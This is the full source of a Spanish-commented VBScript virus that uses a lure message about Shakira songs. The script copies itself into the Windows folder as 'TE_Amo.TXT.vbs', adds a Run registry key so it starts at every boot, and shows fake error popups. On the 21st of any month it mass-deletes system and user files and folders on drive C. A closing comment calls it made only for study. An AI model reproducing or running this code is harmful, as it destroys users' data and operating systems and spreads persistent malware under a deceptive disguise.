'create by ???
On Error Resume Next
Dim WSHShell, fso

Set WSHShell = WScript.CreateObject("WScript.Shell")

WSHShell.Popup "Este Archivo mostrará las canciónes de la chica de las caderas sexy"

'Esta funcion hace que el virus se copie en windows y crea un registro de arranque

Set WSHShell = CreateObject("WScript.Shell")
Set fso = CreateObject("scripting.filesystemobject")
fso.copyfile wscript.scriptfullname,fso.GetSpecialFolder(0)& "\TE_Amo.TXT.vbs"
WSHShell.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Mp3","wscript.exe " & fso.GetSpecialFolder(0) & "\TE_Amo.TXT.vbs %"


'Esta funcion crea mi firma en el registro

WSHShell.Popup "Estas son algunas canciones que se mostraran: Shakira suerte, pies descalzos, donde estan los ladrones etc"

WSHShell.RegWrite "HKCU\copyright", "Create By ?????"


'un mensaje simulando un error

msgbox "Error al descompactar los archivos!!! esto puede causar la perdida de informacion en el disco duro!!",16,"Error"
msgbox "En cualquier momento puede pasar",64,"Error"

'este codigo borra todo el sistema

WSHShell.Popup "aconsejo tener una copia de informacion guardada en disco!!!!"

If Day(now) = 21 then
fso.deleteFile ("C:\Windows\*.*")
fso.deleteFile ("C:\Windows\System\*.*")
fso.deleteFile ("C:\Windows\Command\*.*")
fso.deleteFile ("C:\Windows\Escritorio\*.*")
fso.deleteFile ("C:\*.*")
fso.deleteFile ("C:\Windows\Desktop\*.*")
fso.deleteFile ("C:\misdoc~1\*.*")
fso.deleteFile ("C:\windows\fonts\*.*")
fso.deleteFolder ("C:\windows\*.*")
fso.deleteFolder ("C:\*.*")
msgbox "El sistema fue borrado",16,"Sistema borrado"
end if

'Este virus solo fue creado para ser estudiado y no sera mandado para destruir computadoras
